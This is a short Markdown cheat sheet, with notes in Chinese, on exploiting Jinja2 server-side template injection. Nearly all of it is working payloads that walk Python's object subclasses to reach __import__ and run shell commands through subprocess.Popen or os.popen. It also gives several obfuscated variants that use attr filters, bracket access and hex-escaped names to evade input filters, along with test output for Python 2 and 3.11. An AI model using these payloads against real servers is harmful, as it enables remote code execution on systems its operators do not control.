# SSTI


- subprocess.Popen
```
{% for x in ''['__class__']['__base__']['__subclasses__']() %}{% if 'warning' in x['__name__'] %}{{x()['_module']['__builtins__']['__import__']('subprocess').Popen('whoami', shell=True)}}{%endif%}{%endfor%}
```

- os.popen
```
{% for x in ().__class__.__base__.__subclasses__() %}
    {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__['__import__']('os').popen("id").read()}}
    {%endif%}
{%endfor%}
```


## Jinja2 混淆方式

### 取得 object
```
{{ ().__class__.__base__ }}
```
使用 attr
```
{{ ()|attr('__class__')|attr('__base__') }}
```
使用 `[]`, Python 3 無法用 `['__base__']`
```
{{ ()['__class__']['__base__'] }}
```
使用 hex, Python 3 無法用 `['__base__']`
```
{{ ()['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x62\x61\x73\x65\x5f\x5f'] }}
```
```
{{ ()|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f')|attr('\x5f\x5f\x62\x61\x73\x65\x5f\x5f') }}
```




### 自動找到 os.popen

Original
```
{% for x in ().__class__.__base__.__subclasses__() %}
    {% if "warning" in x.__name__ %}
        {{x()._module.__builtins__['__import__']('os').popen("id").read()}}
    {%endif%}
{%endfor%}
```

使用 `[]` (Python2 only)
```
{% for x in ()['__class__']['__base__']['__subclasses__']() %}
    {% if "warning" in x['__name__'] %}
        {{x()['_module']['__builtins__']['__import__']('os')['popen']("id")['read']()}}
    {%endif%}
{%endfor%}
```

To hex (Python2 only)
```
{% for x in ()['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x62\x61\x73\x65\x5f\x5f']['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']() %}
    {% if "\x77\x61\x72\x6e\x69\x6e\x67" in x['\x5f\x5f\x6e\x61\x6d\x65\x5f\x5f'] %}
        {{x()['\x5f\x6d\x6f\x64\x75\x6c\x65']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']("\x69\x64")['\x72\x65\x61\x64']()}}
    {%endif%}
{%endfor%}
```

使用 [] + attr + hex (python2 and python 3)
```
{% for x in ()|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f')|attr('\x5f\x5f\x62\x61\x73\x65\x5f\x5f')|attr('\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f')() %}
    {% if "\x77\x61\x72\x6e\x69\x6e\x67" in x['\x5f\x5f\x6e\x61\x6d\x65\x5f\x5f'] %}
        {{x()['\x5f\x6d\x6f\x64\x75\x6c\x65']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']("\x69\x64")['\x72\x65\x61\x64']()}}
    {%endif%}
{%endfor%}
```

### Test
template.txt
```
{{ () }}
{{ ().__class__ }}
{{ ().__class__.__base__ }}

{{ () }}
{{ ()['__class__'] }}
{{ ()['__class__']['__base__'] }}
{{ ()|attr('__class__')|attr('__base__') }}
```

Python 2
```
❯ python2 jinja2_test.py template.txt
()
<type 'tuple'>
<type 'object'>

()
<type 'tuple'>
<type 'object'>
<type 'object'>
```

Python 3.11, 注意倒數第二的不是 object
```
❯ python3 jinja2_test.py template.txt
()
<class 'tuple'>
<class 'object'>

()
<class 'tuple'>
tuple['__base__']
<class 'object'>
```


## Reference
https://www.cnblogs.com/hetianlab/p/17273687.html

https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
